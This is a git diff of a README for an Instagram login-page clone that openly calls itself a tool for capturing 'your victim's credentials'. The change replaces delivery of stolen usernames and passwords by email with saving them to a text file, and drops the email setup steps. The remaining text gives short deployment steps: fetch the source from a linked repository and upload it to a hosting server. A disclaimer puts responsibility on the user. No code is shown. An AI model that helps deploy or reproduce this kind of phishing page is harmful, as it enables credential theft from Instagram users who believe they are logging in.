@@ -1,5 +1,5 @@
-# Insta-login
-Instagram login page clone which send your victim's credentials through email.</br>
+# Instagram login web application
+Instagram login page clone which save your victim's credentials through txt file.</br>
 The webpage works on both **mobile** web browsers & **desktop**.<br/>
 
 
@@ -13,20 +13,8 @@ You are solely responsible for your actions, that's obviously not me.**<br/>
 * Get the source [code](https://github.com/vexsx/instagram-phishing)
 
 * Extract the zip and uploade the website on your hosting server
-  - Here i am using **000webhost.com** it's free and allow sending emails too.
-
-![img](static/images/email-check.png)
-
-* Change receiving email address</br>
-
-  - ![img](static/images/email-php_LI.jpg)
-</br>
 
 ### Webpage 
 ![Webpage](static/images/webpage-preview.png)
 
-</br>
 
-* As soon as someone enter **username** & **password** and click on **Log In** button, you will receive an email</br>
-
-  - ![img](static/images/received-email.png)
